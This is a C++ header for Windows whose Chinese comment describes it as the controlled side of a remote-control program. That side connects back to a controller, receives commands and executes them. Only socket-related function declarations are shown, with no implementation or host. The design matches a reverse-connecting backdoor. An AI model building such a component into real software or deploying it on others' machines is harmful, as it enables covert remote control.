#pragma once
/*
服务端，被控制端，负责向控制端发起链接，接收命令并解析执行。
*/
#include <Winsock2.h>
#include<iostream>
#include<Windows.h>
void connnect();
void sendCurrentPath(SOCKET sock);
DWORD WINAPI Fun(LPVOID lpParameter);
void create_thread();


